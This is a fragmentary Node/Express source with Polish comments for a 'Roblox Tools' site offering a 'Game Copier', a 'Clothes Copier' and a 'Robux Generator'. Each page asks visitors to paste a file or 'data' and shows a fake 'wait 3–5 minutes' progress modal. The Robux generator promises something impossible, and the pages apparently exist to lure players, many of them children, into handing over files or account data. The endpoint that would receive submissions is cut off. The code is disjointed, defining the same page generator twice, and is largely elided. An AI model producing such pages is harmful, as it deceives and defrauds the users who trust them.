...
<head>
  ...
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    ...
    .btn span.icon { font-size: 2.2rem; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Roblox Tools</h1>
    <div class="buttons">
      <a href="/game-copier" class="btn">
        <span class="icon">🎮</span> Game Copier
      </a>
      <a href="/clothes-copier" class="btn">
        <span class="icon">👕</span> Clothes Copier
      </a>
      <a href="/robux-generator" class="btn">
        <span class="icon">💰</span> Robux Generator
      </a>
    </div>
  </div>
</body>
...
// ────────────────────────────────────────────────
// Wspólna funkcja do generowania identycznych podstron (Game, Clothes, Robux)
// ────────────────────────────────────────────────
function generateToolPage(title, instruction) {
  return `
<!DOCTYPE html>
<html lang="pl">
<head>
  ...
  <div class="container">
    <div class="left">
      ...
      <div class="subtle-glow-border">
        <div class="inner-box">
          <textarea id="input" placeholder="Paste Your File There"></textarea>
        </div>
      </div>
...
async function start() {
  ...
  showModal(true, 'Process Started', '(wait 3–5 minutes)');
...
// ────────────────────────────────────────────────
// Clothes Copier – identyczna strona jak Game Copier
// ────────────────────────────────────────────────
app.get('/clothes-copier', (req, res) => {
  res.send(generateToolPage('Clothes Copier', 'Paste your clothes file under then click "Start Process" to receive your clothes copy'));
});

// ────────────────────────────────────────────────
// Robux Generator – identyczna strona jak Game Copier
// ────────────────────────────────────────────────
app.get('/robux-generator', (req, res) => {
  res.send(generateToolPage('Robux Generator', 'Paste your data under then click "Start Process" to generate Robux'));
});

// ────────────────────────────────────────────────
// Funkcja generująca identyczne podstrony
// ────────────────────────────────────────────────
function generateToolPage(title, instruction) {
  return `
<!DOCTYPE html>
...
// ────────────────────────────────────────────────
// Endpoint /check – wspólny dla wszystkich narzędzi
// ────────────────────────────────────────────────
